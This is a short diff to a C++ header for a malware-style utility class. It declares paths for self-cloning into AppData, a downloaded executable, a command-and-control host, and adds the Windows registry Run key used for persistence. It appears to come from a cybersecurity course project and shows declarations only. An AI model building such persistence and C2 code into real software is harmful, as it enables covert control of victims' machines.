@@ -14,9 +14,11 @@ class UTIL {
 	string base = "C:\\Users\\";
 	string appData = "\\AppData\\Roaming";
 	string clone = "\\clone.exe";
+	string cloneKeyName = "clone";
 	string downloadFileName = "downloaded.exe";
 	string downloaded = "\\" + downloadFileName;
 	LPCSTR c2host = "www.uvu-cybersecurity.com";
+	LPCSTR runKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 	char filename[MAX_PATH];
 	void getModuleName();
 	string currentDirectory;
@@ -27,11 +29,13 @@ public:
 	string getBase();
 	string getAppData();
 	string getClone();
+	string getCloneKeyName();
 	string getDownloaded();
 	string getDownloadFileName();
 	string getUsername();
 	string getAppDataPath();
 	string getCurrentDirectory();
 	LPCSTR getC2Host();
+	LPCSTR getRunKey();
 	bool isExecutingFromAppData();
 };
